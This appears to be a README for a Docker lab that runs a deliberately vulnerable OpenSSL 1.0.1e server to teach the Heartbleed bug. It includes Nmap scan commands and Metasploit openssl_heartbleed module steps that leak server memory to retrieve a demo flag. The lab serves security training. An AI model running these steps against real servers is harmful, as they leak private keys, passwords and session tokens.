# Heartbleed Vulnerability Lab

This lab simulates the infamous **Heartbleed** vulnerability (CVE-2014-0160) in OpenSSL, allowing attackers to read sensitive data from the server's memory.

## Overview

The lab runs a vulnerable Apache HTTPS server using OpenSSL 1.0.1e (affected version) on port 4443. It includes a demo flag that can be leaked via the vulnerability.

## Prerequisites

- Docker and Docker Compose installed
- Nmap (for vulnerability scanning)
- Metasploit Framework (for exploitation, optional)

## Quick Start

For easy installation in larger projects, run:

```bash
chmod +x install.sh
./install.sh
```

This will build the image, start the container, and provide access instructions.

## Manual Setup

If you prefer manual setup:

1. **Build the vulnerable image:**
   ```bash
   docker-compose build
   ```

2. **Start the container:**
   ```bash
   docker-compose up -d
   ```

3. **Verify it's running:**
   ```bash
   docker-compose ps
   ```

The server will be accessible at `https://localhost:4443/` (accept the self-signed certificate warning).

## Testing the Vulnerability

### Using Nmap
Run a vulnerability scan to confirm Heartbleed is present:
```bash
nmap -sV -p 4443 --script=ssl-heartbleed localhost
```

Expected output includes:
```
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability...
|     State: VULNERABLE
|     Risk factor: High
```

### Manual Verification
- Visit `https://localhost:4443/` in your browser
- The page displays a test message and the flag: `DIABLE{Heartbleed_Vulnerable_Server_2026}`

## Exploitation

### Using Metasploit
1. Start Metasploit:
   ```bash
   msfconsole
   ```

2. Use the Heartbleed module:
   ```bash
   use auxiliary/scanner/ssl/openssl_heartbleed
   set RHOSTS localhost
   set RPORT 4443
   set VERBOSE true
   run
   ```

This will attempt to leak memory contents, potentially revealing the flag and other sensitive data.

### Using Python Script
You can use custom Python scripts like `ssltest.py` or `heartbleed-poc.py` to exploit the vulnerability programmatically.

## The Flag

The lab includes a demo flag: `DIABLE{Heartbleed_Vulnerable_Server_2026}`

- **Environment Variable**: Stored as `HEARTBLEED_FLAG` in the container
- **Memory Location**: Available in Apache's process memory
- **Leak Method**: Can be extracted using Heartbleed exploits that dump SSL memory

## How Heartbleed Works

Heartbleed exploits a buffer over-read bug in OpenSSL's TLS heartbeat extension. Attackers can:
- Send crafted heartbeat requests
- Read up to 64KB of memory beyond the intended buffer
- Leak sensitive data like private keys, passwords, and session tokens

## Cleanup

Stop and remove the container:
```bash
docker-compose down
```

## References

- [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
- [Heartbleed Bug](https://heartbleed.com/)
- [OpenSSL Security Advisory](https://www.openssl.org/news/secadv/20140407.txt)

## Security Note

This is for educational purposes only. Never run vulnerable software in production environments.